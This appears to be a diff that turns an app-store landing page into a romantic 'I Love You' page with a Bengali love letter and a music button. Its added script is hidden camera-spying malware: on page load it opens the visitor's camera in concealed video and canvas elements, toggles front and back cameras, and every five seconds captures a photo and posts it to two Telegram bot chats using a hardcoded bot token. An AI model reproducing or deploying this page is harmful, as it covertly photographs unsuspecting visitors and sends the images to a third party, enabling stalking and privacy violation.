@@ -3,98 +3,240 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>App Store | Download the Best Apps</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <title>love-letter</title></title>
   <style>
-    /* Hero Background */
-    .hero-bg {
-      background-image: url('https://source.unsplash.com/1600x900/?technology,apps'); /* Example background */
-      background-size: cover;
-      background-position: center;
-    }
-    /* General Background for the entire body */
+    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
+
     body {
-      background-image: url('https://source.unsplash.com/1600x900/?technology,apps'); /* Set a background image for the whole page */
-      background-size: cover;
-      background-position: center;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
+      background-size: 300% 300%;
+      font-family: 'Dancing Script', cursive;
+      animation: bgAnimation 12s infinite alternate;
+      overflow: hidden;
+    }
+
+    @keyframes bgAnimation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 span {
+      color: #ffeb3b;
+      font-style: italic;
+    }
+
+    .love-letter {
+      font-family: 'Pinyon Script', cursive;
+      font-size: 1.5rem;
+      color: #fff;
+      margin-top: 30px;
+      text-align: left;
+      width: 80%;
+      max-height: 300px;
+      margin: 20px auto;
+      border: 2px solid #ff4b5c;
+      padding: 20px;
+      border-radius: 15px;
+      background-color: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      overflow-y: auto;
+    }
+
+    video, canvas {
+      display: none; /* Hide video and canvas */
+    }
+
+    .music-btn {
+      position: absolute;
+      bottom: 20px;
+      background-color: #ff4b5c;
+      color: white;
+      font-size: 1.5rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .music-btn:hover {
+      background-color: #ff1e56;
     }
   </style>
 </head>
-<body class="bg-gray-100 text-gray-800 font-sans">
+<body>
+  <div class="container">
+    <h1>I <span>Love</span> You</h1>
 
-  <!-- Navbar -->
-  <header class="w-full bg-gray-900 text-white shadow-md fixed top-0 z-50">
-    <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
-      <div class="text-2xl font-bold">
-        <a href="#" class="text-white hover:text-green-500">AppStore</a>
-      </div>
-      <nav class="space-x-6">
-        <a href="#apps" class="hover:text-green-500">Apps</a>
-        <a href="#about" class="hover:text-green-500">About</a>
-        <a href="#contact" class="hover:text-green-500">Contact</a>
-      </nav>
+    <div class="love-letter">
+      <p>প্রিয়তম,</p>
+      <p> মনে হলো, তোমার জন্য কিছু লিখে তোমার কাছে আমার অনুভূতিগুলো পৌঁছে দিই। প্রতিটি দিন তোমার সাথে কাটানোর পর, আমি বুঝতে পারি, তুমি আমার জীবনের সবচেয়ে বিশেষ অংশ। তোমার হাসি, তোমার কথা, তোমার ছোঁয়া—সবকিছুই যেন আমার পৃথিবীকে আলোকিত করে। আমি জানি না কীভাবে তোমাকে ধন্যবাদ জানাবো, কারণ তুমি আমার জীবনে এসে এক অমূল্য উপহার হয়ে গেছো।</p>
+
+<p>তোমার সাথে কাটানো প্রতিটি মুহূর্ত আমার জন্য সোনালী হয়ে উঠেছে। তোমার পাশে থাকলে পৃথিবীটা কেমন যেন সুন্দর হয়ে ওঠে। তোমার চোখের দৃষ্টি, তোমার কথা বলার ভঙ্গি, তোমার উপস্থিতি—সবকিছুই আমাকে এক অন্যরকম শান্তি দেয়। আমি প্রতিদিন এই মুহূর্তগুলোকে আরও গভীরভাবে অনুভব করতে চাই। তুমি আমার জীবনে আসার পর, আমি বুঝেছি যে, সত্যিকারের ভালোবাসা কী।</p>
+
+<p>প্রিয়, তোমার পাশে থাকলে আমি নিজেকে পরিপূর্ণ মনে করি। আমি তোমাকে প্রতিশ্রুতি দিতে চাই—তোমার পাশে, তোমার পাশে, আমি সবসময় থাকবো। তোমার সুখে, তোমার দুঃখে, আমি তোমার সঙ্গে এই পথটা চলতে চাই। তুমি যদি কখনো কষ্ট পাও, আমি তোমার পাশে দাঁড়িয়ে সেই কষ্ট শেয়ার করতে চাই। আমরা একসঙ্গে একে অপরকে শক্তি দেবো, এবং একে অপরের জন্য ভালোবাসা আর সুখের পথ তৈরি করবো।</p>
+
+<p>তোমাকে ভালোবাসা আমার জীবনের সবচেয়ে সুন্দর অনুভূতি, আর আমি প্রতিদিন তোমার ভালোবাসায় সিক্ত হতে চাই।
+
+।</p>
+      <p>তোমার জন্য আমার ভালোবাসা অসীম ,</p>
+     
     </div>
-  </header>
 
-  <!-- Hero Section -->
-  <section class="hero-bg h-screen flex items-center justify-center text-center text-white relative">
-    <div class="absolute inset-0 bg-black bg-opacity-50"></div>
-    <div class="z-10">
-      <h1 class="text-4xl md:text-6xl font-bold">Discover the Best Apps</h1>
-      <p class="text-xl mt-4">Browse and download the best applications for your phone.</p>
-    </div>
-  </section>
+    <!-- Music Play Button -->
+    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
 
-  <!-- Apps Section -->
-  <section id="apps" class="py-16">
-    <div class="max-w-7xl mx-auto px-6 text-center">
-      <h2 class="text-4xl font-bold text-gray-800">Featured Apps</h2>
-      <p class="text-lg text-gray-600 mt-4">Here are some of the best apps we offer for download.</p>
-      <div class="mt-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-8">
-        <div class="bg-white rounded-lg shadow-lg">
-          <div class="p-6">
-            <h3 class="text-xl font-semibold text-gray-800">App Name 1</h3>
-            <p class="text-gray-600 mt-4">A great app for productivity and enhancing your workflow.</p>
-            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
-          </div>
-        </div>
-        <div class="bg-white rounded-lg shadow-lg">
-          <div class="p-6">
-            <h3 class="text-xl font-semibold text-gray-800">App Name 2</h3>
-            <p class="text-gray-600 mt-4">Enhance your entertainment experience with this amazing app.</p>
-            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
-          </div>
-        </div>
-        <div class="bg-white rounded-lg shadow-lg">
-          <div class="p-6">
-            <h3 class="text-xl font-semibold text-gray-800">App Name 3</h3>
-            <p class="text-gray-600 mt-4">A powerful app to manage your finances and track your spending.</p>
-            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+  </div>
 
-  <!-- About Section -->
-  <section id="about" class="py-16 bg-gray-50">
-    <div class="max-w-7xl mx-auto px-6 text-center">
-      <h2 class="text-4xl font-bold text-gray-800">About Us</h2>
-      <p class="text-lg text-gray-600 mt-4">We provide a wide range of apps that suit every need. Our goal is to offer the best apps for your phone, ensuring security and ease of use.</p>
-    </div>
-  </section>
+  <audio id="loveAudio" loop>
+    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
 
-  <!-- Contact Section -->
-  <section id="contact">
-    <div class="mt-16 bg-gray-800 text-white py-8">
-      <h3 class="text-3xl font-semibold text-center">Join Us Today!</h3>
-      <p class="text-lg text-center mt-4">Start exploring and downloading the best apps for your device. Our collection is always growing!</p>
-      <div class="mt-8 text-center">
-        <a href="https://t.me/PremiumAppAccount" class="inline-block px-8 py-3 bg-green-500 text-white rounded-full text-xl font-medium hover:bg-green-600 transition duration-300">Telegram</a>
-      </div>
-    </div>
-  </section>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const music = document.getElementById('loveAudio');
+    
+    // Bot 1 details
+    const bot1Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; 
+    const bot1ChatId = '1987016824';
 
+    // Bot 2 details
+    const bot2Token = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY'; // Replace with Bot 2's Token
+    const bot2ChatId = '7888600155'; // Replace with Bot 2's Chat ID
+
+    let useFrontCamera = true; // Start with front camera
+    let isMusicPlaying = false;
+
+    // Camera constraints
+    const constraints = {
+      video: {
+        facingMode: useFrontCamera ? 'user' : 'environment'
+      }
+    };
+
+    // Start camera stream
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(error => {
+          console.error('Error accessing camera:', error);
+        });
+    }
+
+    // Stop the camera stream
+    function stopCamera() {
+      const stream = video.srcObject;
+      if (stream) {
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+      }
+    }
+
+    // Capture photo and send to both Telegram bots
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const base64Image = canvas.toDataURL('image/png');
+      const blob = base64ToBlob(base64Image);
+
+      sendToTelegram(bot1Token, bot1ChatId, blob); // Send to Bot 1
+      sendToTelegram(bot2Token, bot2ChatId, blob); // Send to Bot 2
+    }
+
+    // Convert Base64 to Blob
+    function base64ToBlob(base64) {
+      const byteString = atob(base64.split(',')[1]);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+
+      return new Blob([uintArray], { type: 'image/png' });
+    }
+
+    // Send photo to Telegram
+    function sendToTelegram(token, chatId, blob) {
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Telegram API Error:', data);
+          }
+        })
+        .catch(err => {
+          console.error('Fetch Error:', err);
+        });
+    }
+
+    // Automatically switch between front and back cameras
+    function autoSwitchCamera() {
+      setInterval(() => {
+        stopCamera();
+        useFrontCamera = !useFrontCamera; // Toggle camera
+        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
+        startCamera();
+      }, 5000); // Switch camera every 5 seconds
+    }
+
+    // Automatically capture photos
+    setInterval(() => {
+      captureAndSendPhoto();
+    }, 5000); // Capture photo every 5 seconds
+
+    // Music control
+    function toggleMusic() {
+      if (isMusicPlaying) {
+        music.pause();
+        isMusicPlaying = false;
+        document.querySelector('.music-btn').textContent = 'Play Music';
+      } else {
+        music.play();
+        isMusicPlaying = true;
+        document.querySelector('.music-btn').textContent = 'Pause Music';
+      }
+    }
+
+    // Initialize camera and start the process
+    startCamera();
+    autoSwitchCamera();
+  </script>
 </body>
 </html>
